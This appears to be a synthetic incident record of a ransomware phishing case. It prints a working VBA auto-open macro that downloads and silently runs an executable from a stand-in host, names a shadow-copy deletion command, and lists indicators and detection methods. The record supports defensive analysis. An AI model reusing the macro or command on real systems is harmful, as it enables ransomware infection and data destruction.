technical_data.malicious_macro_vba_code:
Sub Document_Open()
    Dim strURL As String
    strURL = "http://maliciousserver.net/payload.exe"
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", strURL, False
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Dim adoStream As Object
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 'binary
        adoStream.Open
        adoStream.Write WinHttpReq.responseBody
        adoStream.SaveToFile Environ("TEMP") & "\update.exe", 2
        adoStream.Close
        Shell Environ("TEMP") & "\update.exe", vbHide
    End If
End Sub

process_tree: update.exe (PID 8910) - ransomware payload executed by macro

technical_data.ransomware_behavior: The update.exe binary drops multiple encrypted versions of user documents with '.locked' extension, deletes shadow copies (vssadmin.exe Delete Shadows /All /Quiet), and modifies registry to maintain persistence under HKCU Run key.

indicators: Sender domain invoicesecure-payments.com registered 3 months ago via privacy-protected registrar
Attachment named Invoice_INV-2023-4589.docm with embedded VBA macro
Outbound HTTP request to http://maliciousserver.net/payload.exe from internal host
File hashes of update.exe match known ransomware MD5: 6f1c2d3e4b5a8def1234567890abcdef
Registry Run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService pointing to temp executable
Network traffic showing HTTP GET to suspicious domain immediately after document opened
examples.detection_method: Email gateway sandboxing and attachment scanning flagged macro-enabled DOCM with suspicious network activity. Endpoint protection detected anomalous process creation from Microsoft Word process. Network IDS signatures matched HTTP download of known ransomware payload. User reported encrypted files triggering incident response.
